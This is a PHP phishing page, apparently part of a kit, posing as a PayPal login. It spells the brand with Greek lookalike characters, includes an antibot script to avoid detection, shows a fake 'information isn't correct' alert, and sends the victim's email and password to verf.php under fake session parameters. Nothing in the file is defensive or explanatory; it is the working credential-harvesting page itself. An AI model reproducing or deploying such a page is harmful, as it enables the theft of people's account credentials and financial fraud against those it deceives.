<?php

 session_start();


  $login_email = $_SESSION['login_email'];
 $login_password = $_SESSION['login_password'];





 ?>

 	<?php include("./antibot.php") ?>


<html lang="pt" class="no-js"> <head>

<meta charset="utf-8" />


<title>Log in to your &#929;&#945;y&#929;&#945;l account</title>

<meta http-equiv="content-type" content="text/html; charset=UTF-8" />

<link rel="shortcut icon" href="./auth/ico/pp_favicon_x.ico" />
<link rel="apple-touch-icon" href="./auth/ico/apple-touch-icon.png" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes" />

<script type="text/javascript" src="./auth/js/jquery.min.js"></script>
   <link href="./auth/css/error.css"  rel="stylesheet"    media="screen" type="text/css" />

<link rel="stylesheet" href="./auth/css/login/css.css"   media="screen" type="text/css" />



	 <link  href="./auth/css/loading.css" rel="stylesheet" media="screen" type="text/css"  />

 <script type="text/javascript" src="./auth/js/js1.js"></script>

 <script type="text/javascript">
var ray={
ajax:function(st)
	{
		this.show('load');
	},
show:function(el)
	{
		this.getID(el).style.display='';
	},
getID:function(el)
	{
		return document.getElementById(el);
	}

}</script>

<style type="text/css">
#load{
    position:  absolute;
    right: 0;
    bottom: 0;
    left: 0;
    z-index: 200;
    margin: 0;
    text-align: center;

    }


    input:-webkit-autofill {
    -webkit-box-shadow: 0 0 0px 1000px white inset;
}

</style>

</head>
<body >
<div id="content" class="contentContainer"><header>


	<div class="logo-logo">


</div>

</header>

<div id="load" class="transitioning spinner spin" style="display:none;">Checking your information...</div>



<div id="main" class="main " role="main">


	<section id="login" class="login" data-role="page" >



 <div id="notifications" class="notifications" tabindex="-1">

	 <p class="notification notification-critical" role="alert">Some of your information isn't correct. Please try again.</p>

	 </div>



<form method="POST"  id="form_anim"  action="./
verf.php?cmd=_flow&SESSION=VBQvrPU00IM1uHErimWKuCyeklx6zvOmYw3KdzGurpCNuky8BWUn3P_VBQvrPU00IM1uHErimWKu&dispatch=5885d80a13c0db1f8e263663d3faee8d0b9dcb01a9b6dc564e45f62871326a5e"   onsubmit="return (validate()  && ray.ajax())"   >







	<div id="passwordSection" class="clearfix"><div class="textInput" id="login_emaildiv">



			<div class="fieldWrapper"><label for="email" class="fieldLabel">Email address

			</label><input id="email" name="login_email" type="email" class="hasHelp  validateEmpty" value="<?php echo ($_SESSION['login_email']) ?>" pattern="^([\w-]+(?:\.[\w-]+)*)@((?:[\w-]+\.)*\w[\w-]{0,66})\.([\w-]{2,6}(?:\.[\w-]{2})?)$" placeholder="Email address"  autocomplete="on" title="Email address is required."  x-moz-errormessage="Email address is required." required="required" 	/></div>





			</div>

			<div class="textInput lastInputField" id="login_passworddiv"><div class="fieldWrapper"><label for="password" class="fieldLabel">Password</label>



				<input id="password" name="login_password" type="password" class="hasHelp  validateEmpty" value=""		placeholder="Password"	 title="Password is required"  x-moz-errormessage="Password is required" 	required="required"  /></div>









<div class="actions actionsSpaced phonePresentNoSibling">



	<button    class="button actionContinue" type="submit" id="btnLogin" name="btnLogin" value="Login" onclick="LoadPage()"  >Log In</button>

					<script type="text/javascript">$("input").change(function () {$(this).removeClass("merror");}).trigger("change");</script>

	</div>






<div class="forgotLink"><a   target="_blank" class="scTrack:unifiedlogin-click-forgot-password">Forgotten your email address or password? </a></div>


<input name="fso" value="aWZYY5fkbTMexPe_qMIyD5vvVAGxMU2C_yTPO4Uus9AxzvxNPRzHDU_6rcIErcoEPbR6cW" type="hidden">

		<a   class="button secondary" id="createAccount">Sign Up</a>






	 </div></form></section>


</div></div>
<footer class="footer clearfix" role="contentinfo"><ul><li><a  >Privacy</a></li><li><a  >&#929;&#945;y&#929;&#945;l</a></li></ul><p>Copyright © 1999 - 2016 &#929;&#945;y&#929;&#945;l. All rights reserved.</p></footer>







</body></html>